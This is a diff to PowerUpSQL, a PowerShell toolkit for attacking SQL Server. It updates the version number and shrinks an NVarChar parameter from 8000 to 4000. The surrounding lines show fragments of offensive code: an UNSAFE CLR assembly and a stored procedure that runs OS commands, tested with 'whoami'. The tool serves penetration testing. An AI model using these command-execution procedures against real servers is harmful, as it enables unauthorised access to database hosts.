@@ -3,7 +3,7 @@
         File: PowerUpSQL.ps1
         Author: Scott Sutherland (@_nullbind), NetSPI - 2016
         Major Contributors: Antti Rantasaari and Eric Gruber
-        Version: 1.0.0.73
+        Version: 1.0.0.74
         Description: PowerUpSQL is a PowerShell toolkit for attacking SQL Server.
         License: BSD 3-Clause
         Required Dependencies: PowerShell v.2
@@ -9496,7 +9496,7 @@ function Create-SQLFileCLRDll
         proc.Start();
 
             // Create the record and specify the metadata for the columns.
-	        SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 8000));
+	        SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));
 
 	        // Mark the begining of the result-set.
 	        SqlContext.Pipe.SendResultsStart(record);
@@ -9548,7 +9548,7 @@ function Create-SQLFileCLRDll
         }
         $stringBuilder.Append("`n with permission_set = UNSAFE")
         $stringBuilder.Append(" GO")
-        $stringBuilder.Append(" CREATE PROCEDURE [dbo].[$ProcedureName] @execCommand NVARCHAR (8000) AS EXTERNAL NAME [$ProcedureName].[StoredProcedures].[$ProcedureName];")
+        $stringBuilder.Append(" CREATE PROCEDURE [dbo].[$ProcedureName] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [$ProcedureName].[StoredProcedures].[$ProcedureName];")
         $stringBuilder.Append(" GO")
         $stringBuilder.Append(" EXEC[dbo].[cmd_exec] 'whoami'")        
         $stringBuilder.Append(" GO")
